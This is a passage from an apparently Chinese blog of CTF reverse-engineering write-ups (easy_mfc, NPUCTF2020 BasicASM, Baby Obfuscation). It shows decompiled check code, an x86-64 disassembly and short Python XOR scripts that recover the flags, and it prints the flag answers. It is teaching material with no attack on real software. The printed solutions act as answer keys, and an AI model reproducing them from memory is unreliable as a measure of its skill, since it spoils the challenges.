class="built_in">chr</span>(x)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">flag += <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><strong>n1book{4Ff1n3_C1pH3R}</strong></p><h2 id="easy-mfc"><a href="#easy-mfc" class="headerlink" title="easy_mfc"></a>easy_mfc</h2><p>前几天做Reversing.Kr时接触过mfc的概念(被干碎了)<br>这题打开还是不好找到逻辑<br>WinMain里面貌似没有进行check操作<br>还好函数很少 挨个翻<br>翻到有个check</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">v7[<span class="number">0</span>] = <span class="number">0x928C9DBC</span>;</span><br><span class="line">v7[<span class="number">1</span>] = <span class="number">0x21864740</span>;</span><br><span class="line">v7[<span class="number">2</span>] = <span class="number">0xFD8FACF5</span>;</span><br><span class="line">v3 = *(_DWORD *)(a2 - <span class="number">12</span>) == <span class="number">26</span>;              <span class="comment">// len=26</span></span><br><span class="line">v7[<span class="number">3</span>] = <span class="number">0x3AE9E468</span>;</span><br><span class="line">v7[<span class="number">4</span>] = <span class="number">0x64B366C0</span>;</span><br><span class="line">v7[<span class="number">5</span>] = <span class="number">0x22D3797E</span>;</span><br><span class="line">v8 = <span class="number">0xF831</span>;</span><br><span class="line">v5[<span class="number">0</span>] = <span class="number">0xFDEEACD2</span>;</span><br><span class="line">v5[<span class="number">1</span>] = <span class="number">0x79FD2C2F</span>;</span><br><span class="line">v5[<span class="number">2</span>] = <span class="number">0x85D0DEC5</span>;</span><br><span class="line">v5[<span class="number">3</span>] = <span class="number">0xBB6B658</span>;</span><br><span class="line">v5[<span class="number">4</span>] = <span class="number">0x54C039F5</span>;</span><br><span class="line">v5[<span class="number">5</span>] = <span class="number">0x54E21F21</span>;</span><br><span class="line">v6 = <span class="number">0x8502</span>;</span><br><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = <span class="number">0</span>;                                     <span class="comment">// CHECK！</span></span><br><span class="line">  <span class="keyword">while</span> ( (*((<span class="type">unsigned</span> __int8 *)v7 + v4) ^ (<span class="type">unsigned</span> __int16)ATL::CSimpleStringT&lt;<span class="type">wchar_t</span>,<span class="number">1</span>&gt;::<span class="built_in">GetAt</span>(&amp;a2, v4)) == *((<span class="type">unsigned</span> __int8 *)v5 + v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v4 &gt;= *(_DWORD *)(a2 - <span class="number">12</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      CWnd::<span class="built_in">SetDlgItemTextW</span>(<span class="keyword">this</span>, <span class="number">-1</span>, <span class="string">L&quot;OK&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">CWnd::<span class="built_in">SetDlgItemTextW</span>(<span class="keyword">this</span>, <span class="number">-1</span>, <span class="string">L&quot;Error&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里提取出两个数组 xor回去即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc1 = <span class="string">&quot;BC9D8C9240478621F5AC8FFD68E4E93AC066B3647E79D32231F8&quot;</span></span><br><span class="line">enc2 = <span class="string">&quot;D2ACEEFD2F2CFD79C5DED08558B6B60BF539C054211FE2540285&quot;</span></span><br><span class="line">enc1 = [<span class="built_in">int</span>(enc1[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc1)//<span class="number">2</span>)]</span><br><span class="line">enc2 = [<span class="built_in">int</span>(enc2[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc2)//<span class="number">2</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc1)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc1[i]^enc2[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>n1book{X0r_x0R_15_s0_f1v3}</strong></p><hr><hr><p>立个flag 过段时间抽空认真学学mfc编程 先了解开发原理再逆向</p><p>这个系列还剩一道python 貌似不能直接反编译.pyc 应该是要查看字节码 过段时间再来看吧</p><h1 id="NPUCTF2020"><a href="#NPUCTF2020" class="headerlink" title="NPUCTF2020"></a>NPUCTF2020</h1><h2 id="BasicASM"><a href="#BasicASM" class="headerlink" title="BasicASM"></a>BasicASM</h2><p>给的一个asm文件 IDA啥也看不了 用winhex查看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00007F</span>F7A8AC5A50  push        rbp  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A52  push        rdi  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A53  sub         rsp,<span class="number">238</span>h  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A5A  lea         rbp,[rsp+<span class="number">20</span>h]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A5F  mov         rdi,rsp  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A62  mov         ecx,<span class="number">8</span>Eh  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A67  mov         eax,<span class="number">0</span>CCCCCCCCh  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A6C  rep stos    dword ptr [rdi]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A6E  mov         rax,qword ptr [__security_cookie (<span class="number">07F</span>F7A8AD3018h)]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A75  <span class="keyword">xor</span>         rax,rbp  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A78  mov         qword ptr [rbp+<span class="number">208</span>h],rax  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A7F  lea         rcx,[__06A15900_ConsoleApplication@<span class="built_in">cpp</span> (<span class="number">07F</span>F7A8AD902Ah)]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A86  call        __CheckForDebuggerJustMyCode (<span class="number">07F</span>F7A8AC1122h)  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A8B  lea         rdx,[string <span class="string">&quot;flag&#123;this_is_a_fake_flag&#125;&quot;</span> (<span class="number">07F</span>F7A8ACF450h)]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A92  lea         rcx,[flag]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A96  call        std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt; &gt;::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt; &gt; (<span class="number">07F</span>F7A8AC15E1h)  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A9B  nop  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5A9C  mov         dword ptr [p],<span class="number">0</span>  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AA3  mov         dword ptr [rbp+<span class="number">64</span>h],<span class="number">0</span>  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AAA  jmp         main+<span class="number">64</span>h (<span class="number">07F</span>F7A8AC5AB4h)  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AAC  mov         eax,dword ptr [rbp+<span class="number">64</span>h]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AAF  inc         eax  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AB1  mov         dword ptr [rbp+<span class="number">64</span>h],eax  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AB4  movsxd      rax,dword ptr [rbp+<span class="number">64</span>h]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AB8  mov         qword ptr [rbp+<span class="number">1F</span>8h],rax  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5ABF  lea         rcx,[flag]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AC3  call        std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt; &gt;::<span class="built_in">length</span> (<span class="number">07F</span>F7A8AC122Bh)  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AC8  mov         rcx,qword ptr [rbp+<span class="number">1F</span>8h]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5ACF  cmp         rcx,rax  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AD2  jae         main+<span class="number">1B</span>2h (<span class="number">07F</span>F7A8AC5C02h)  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AD8  mov         eax,dword ptr [rbp+<span class="number">64</span>h]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5ADB  <span class="keyword">and</span>         eax,<span class="number">1</span>  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5ADE  cmp         eax,<span class="number">1</span>  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AE1  jne         main+<span class="number">126</span>h (<span class="number">07F</span>F7A8AC5B76h)  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AE7  movsxd      rax,dword ptr [rbp+<span class="number">64</span>h]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AEB  mov         rdx,rax  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AEE  lea         rcx,[flag]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AF2  call        std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt; &gt;::<span class="keyword">operator</span>[] (<span class="number">07F</span>F7A8AC1442h)  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AF7  movsx       eax,byte ptr [rax]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AFA  <span class="keyword">xor</span>         eax,<span class="number">42</span>h  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AFD  mov         dword ptr [p],eax  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5B00  mov         dl,<span class="number">30</span>h  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5B02  lea         rcx,[rbp+<span class="number">144</span>h]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5B09  call        std::<span class="built_in">setfill</span>&lt;<span class="type">char</span>&gt; (<span class="number">07F</span>F7A8AC1046h)  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5B0E  mov         qword ptr [rbp+<span class="number">1F</span>8h],rax  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5B15  mov         edx,<span class="number">2</span>  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5B1A  lea         rcx,[rbp+<span class="number">168</span>h]  </span><br><span class="line"><span class="number">00007F</span><span class="function">F7A8AC5B21  call        <span class="title">std::setw</span> <span class="params">(<span class="number">07F</span>F7A8AC10D2h)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B26  mov         qword ptr [rbp+200h],rax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B2D  lea         rdx,[<span class="title">std::hex</span> <span class="params">(<span class="number">07F</span>F7A8AC1488h)</span>]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B34  mov         rcx,qword ptr [<span class="title">__imp_std::cout</span> <span class="params">(<span class="number">07F</span>F7A8AD71C0h)</span>]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B3B  call        qword ptr [__imp_std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt; &gt;::<span class="keyword">operator</span>&lt;&lt; <span class="params">(<span class="number">07F</span>F7A8AD7160h)</span>]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B41  mov         rcx,qword ptr [rbp+200h]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B48  mov         rdx,rcx  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B4B  mov         rcx,rax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B4E  call        std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,__int64&gt; <span class="params">(<span class="number">07F</span>F7A8AC12F8h)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B53  mov         rcx,qword ptr [rbp+1F8h]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B5A  mov         rdx,rcx  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B5D  mov         rcx,rax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B60  call        std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,<span class="type">char</span>&gt; <span class="params">(<span class="number">07F</span>F7A8AC11A4h)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B65  mov         edx,dword ptr [p]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B68  mov         rcx,rax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B6B  call        qword ptr [__imp_std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt; &gt;::<span class="keyword">operator</span>&lt;&lt; <span class="params">(<span class="number">07F</span>F7A8AD7158h)</span>]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B71  jmp         main+1<span class="title">ADh</span> <span class="params">(<span class="number">07F</span>F7A8AC5BFDh)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B76  movsxd      rax,dword ptr [rbp+64h]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B7A  mov         rdx,rax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B7D  lea         rcx,[flag]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B81  call        std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt; &gt;::<span class="keyword">operator</span>[] <span class="params">(<span class="number">07F</span>F7A8AC1442h)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B86  movsx       eax,byte ptr [rax]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B89  mov         dword ptr [p],eax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B8C  mov         dl,30h  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B8E  lea         rcx,[rbp+194h]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B95  call        std::setfill&lt;<span class="type">char</span>&gt; <span class="params">(<span class="number">07F</span>F7A8AC1046h)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5B9A  mov         qword ptr [rbp+1F8h],rax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BA1  mov         edx,2  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BA6  lea         rcx,[rbp+1B8h]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BAD  call        <span class="title">std::setw</span> <span class="params">(<span class="number">07F</span>F7A8AC10D2h)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BB2  mov         qword ptr [rbp+200h],rax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BB9  lea         rdx,[<span class="title">std::hex</span> <span class="params">(<span class="number">07F</span>F7A8AC1488h)</span>]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BC0  mov         rcx,qword ptr [<span class="title">__imp_std::cout</span> <span class="params">(<span class="number">07F</span>F7A8AD71C0h)</span>]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BC7  call        qword ptr [__imp_std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt; &gt;::<span class="keyword">operator</span>&lt;&lt; <span class="params">(<span class="number">07F</span>F7A8AD7160h)</span>]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BCD  mov         rcx,qword ptr [rbp+200h]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BD4  mov         rdx,rcx  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BD7  mov         rcx,rax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BDA  call        std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,__int64&gt; <span class="params">(<span class="number">07F</span>F7A8AC12F8h)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BDF  mov         rcx,qword ptr [rbp+1F8h]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BE6  mov         rdx,rcx  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BE9  mov         rcx,rax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BEC  call        std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,<span class="type">char</span>&gt; <span class="params">(<span class="number">07F</span>F7A8AC11A4h)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BF1  mov         edx,dword ptr [p]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BF4  mov         rcx,rax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BF7  call        qword ptr [__imp_std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt; &gt;::<span class="keyword">operator</span>&lt;&lt; <span class="params">(<span class="number">07F</span>F7A8AD7158h)</span>]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5BFD  jmp         main+5<span class="title">Ch</span> <span class="params">(<span class="number">07F</span>F7A8AC5AACh)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C02  mov         dword ptr [rbp+1E4h],0  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C0C  lea         rcx,[flag]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C10  call        std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt; &gt;::~basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt; &gt; <span class="params">(<span class="number">07F</span>F7A8AC1302h)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C15  mov         eax,dword ptr [rbp+1E4h]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C1B  mov         edi,eax  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C1D  lea         rcx,[rbp-20h]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C21  lea         rdx,[__xt_z+540<span class="title">h</span> <span class="params">(<span class="number">07F</span>F7A8ACEFE0h)</span>]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C28  call        _<span class="title">RTC_CheckStackVars</span> <span class="params">(<span class="number">07F</span>F7A8AC1596h)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C2D  mov         eax,edi  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C2F  mov         rcx,qword ptr [rbp+208h]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C36  <span class="keyword">xor</span>         rcx,rbp  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C39  call        __<span class="title">security_check_cookie</span> <span class="params">(<span class="number">07F</span>F7A8AC1190h)</span>  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C3E  lea         rsp,[rbp+218h]  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C45  pop         rdi  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C46  pop         rbp  </span></span><br><span class="line"><span class="function">00007FF7A8AC5C47  ret  </span></span><br></pre></td></tr></table></figure><p>逻辑不难 能找到关键点 xor 42h<br>同时题目也给了output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">662e61257b26301d7972751d6b2c6f355f3a38742d74341d61776d7d7d</span><br></pre></td></tr></table></figure><p>然而直接解发现得到无意义字符串<br>再仔细看汇编 发现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00007F</span>F7A8AC5AC3  call        std::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt; &gt;::<span class="built_in">length</span> (<span class="number">07F</span>F7A8AC122Bh)  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AC8  mov         rcx,qword ptr [rbp+<span class="number">1F</span>8h]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5ACF  cmp         rcx,rax  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AD2  jae         main+<span class="number">1B</span>2h (<span class="number">07F</span>F7A8AC5C02h)  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AD8  mov         eax,dword ptr [rbp+<span class="number">64</span>h]  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5ADB  <span class="keyword">and</span>         eax,<span class="number">1</span>  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5ADE  cmp         eax,<span class="number">1</span>  </span><br><span class="line"><span class="number">00007F</span>F7A8AC5AE1  jne         main+<span class="number">126</span>h (<span class="number">07F</span>F7A8AC5B76h)  </span><br></pre></td></tr></table></figure><p>这段有个 eax&amp;1&#x3D;&#x3D;1的判断 并有条件跳转<br>结合上下知道这里是对循环次数进行了奇偶check<br>所以奇数时才xor 0x42 (jne)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&quot;662e61257b26301d7972751d6b2c6f355f3a38742d74341d61776d7d7d&quot;</span></span><br><span class="line">enc = [<span class="built_in">int</span>(enc[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)//<span class="number">2</span>)]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x42</span>,<span class="number">0x42</span>+<span class="number">1</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">        <span class="keyword">if</span>(i&amp;<span class="number">1</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>((x^c)&amp;<span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(c)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><strong>flag{d0_y0u_know_x86-64_a5m?}</strong></p><h2 id="Baby-Obfuscation"><a href="#Baby-Obfuscation" class="headerlink" title="Baby Obfuscation"></a>Baby Obfuscation</h2><p>花里胡哨…</p><p>对main进行计算 还原流程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(v30, <span class="number">0</span>, <span class="number">4004</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v28, <span class="number">0</span>, <span class="number">260</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">64</span>; ++i )</span><br><span class="line">    v28[i] = i + <span class="number">1</span>;</span><br><span class="line">  v31[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">  v31[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">  v31[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">  v31[<span class="number">3</span>] = <span class="number">5</span>;</span><br><span class="line">  v30[<span class="number">1004</span>] = <span class="number">2</span>;</span><br><span class="line">  v30[<span class="number">1005</span>] = <span class="number">3</span>;</span><br><span 